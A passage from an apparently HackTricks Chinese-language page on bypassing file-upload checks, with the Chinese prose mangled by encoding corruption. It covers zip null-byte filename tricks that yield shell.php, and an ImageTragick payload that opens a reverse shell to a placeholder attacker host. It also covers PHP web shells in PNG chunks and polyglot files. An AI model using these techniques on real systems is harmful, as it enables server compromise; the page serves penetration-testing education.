è¯·æ³¨æ„ï¼Œåç§°ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ç¼–è¾‘ç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œå¹¶å°†ä½äºä¸­å¤®ç›®å½•å¤´éƒ¨çš„å­—æ®µåç§°ä¸­çš„æ­¤å­—ç¬¦æ›´æ”¹ä¸ºç©ºå­—èŠ‚`00`ï¼š
```bash
# before changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# after changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```
å½“åº”ç”¨ç¨‹åºæ£€æŸ¥zipæ–‡ä»¶ä¸­çš„æ–‡ä»¶åæ—¶ï¼Œç”¨äºæ­¤æ£€æŸ¥çš„åç§°å°†æ˜¯æœ¬åœ°æ–‡ä»¶å¤´çš„åç§°ï¼Œä½†å¦‚æœzipæ–‡ä»¶è¢«åŠ å¯†ï¼Œåˆ™ä¸æ˜¯è¿™æ ·ï¼ˆè¯·å‚é˜…pkzipè§„èŒƒï¼‰ã€‚å½“7zæˆ–unzipåœ¨ä¸¤ä¸ªåç§°ä¹‹é—´çœ‹åˆ°å·®å¼‚æ—¶ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶çš„åç§°å°†æ˜¯ä¸­å¤®ç›®å½•å¤´çš„åç§°ã€‚ç”±äºç©ºå­—èŠ‚çš„å­˜åœ¨ï¼Œåç§°å°†æ˜¯`shell.php`ã€‚

è§£å‹åï¼š
```bash
7z e poc.zip
ls
shell.php
```
**å‚è€ƒèµ„æ–™**ï¼š

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

[https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

# ImageTragic

å°†æ­¤å†…å®¹ä»¥å›¾åƒæ‰©å±•åä¸Šä¼ ä»¥åˆ©ç”¨æ¼æ´ **\(ImageMagick , 7.0.1-1\)**
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# åœ¨ PNG å›¾åƒä¸­åµŒå…¥ PHP Shell

å°† Web Shell æ”¾åœ¨ IDAT å—ä¸­çš„ä¸»è¦åŸå› æ˜¯å®ƒèƒ½å¤Ÿç»•è¿‡è°ƒæ•´å¤§å°å’Œé‡æ–°é‡‡æ ·æ“ä½œ - PHP-GD åŒ…å«ä¸¤ä¸ªå‡½æ•°æ¥å®ç°è¿™ä¸€ç‚¹ [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) å’Œ [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)ã€‚

é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼š[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# å¤šè¯­è¨€æ–‡ä»¶

åœ¨å®‰å…¨ä¸Šä¸‹æ–‡ä¸­ï¼Œå¤šè¯­è¨€æ–‡ä»¶æ˜¯ä¸€ç§åŒæ—¶æ˜¯å¤šç§ä¸åŒæ–‡ä»¶ç±»å‹çš„æœ‰æ•ˆå½¢å¼çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ[GIFAR](https://en.wikipedia.org/wiki/Gifar) æ—¢æ˜¯ GIF æ–‡ä»¶åˆæ˜¯ RAR æ–‡ä»¶ã€‚è¿˜æœ‰ä¸€äº›æ–‡ä»¶å¯ä»¥åŒæ—¶æ˜¯ GIF å’Œ JSï¼ŒPPT å’Œ JS ç­‰ã€‚

å¤šè¯­è¨€æ–‡ä»¶ç»å¸¸ç”¨äºç»•è¿‡åŸºäºæ–‡ä»¶ç±»å‹çš„ä¿æŠ¤ã€‚è®¸å¤šå…è®¸ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åº”ç”¨ç¨‹åºåªå…è®¸ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ JPEGã€GIFã€DOCï¼Œä»¥é˜²æ­¢ç”¨æˆ·ä¸Šä¼ æ½œåœ¨å±é™©çš„æ–‡ä»¶ï¼Œå¦‚ JS æ–‡ä»¶ã€PHP æ–‡ä»¶æˆ– Phar æ–‡ä»¶ã€‚

è¿™æœ‰åŠ©äºä¸Šä¼ ä¸€ä¸ªç¬¦åˆå¤šç§ä¸åŒæ ¼å¼çš„æ–‡ä»¶ã€‚å®ƒå¯ä»¥å…è®¸ä½ ä¸Šä¼ ä¸€ä¸ª PHAR æ–‡ä»¶ï¼ˆPHp ARchiveï¼‰ï¼Œå®ƒçœ‹èµ·æ¥ä¹Ÿåƒä¸€ä¸ª JPEGï¼Œä½†å¦‚æœä¸Šä¼ å‡½æ•°ä¸å…è®¸å®ƒï¼Œè¿™å¯¹ä½ æ²¡æœ‰å¸®åŠ©ã€‚

æ›´å¤šä¿¡æ¯è¯·å‚è€ƒï¼š[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­ **ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š** å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
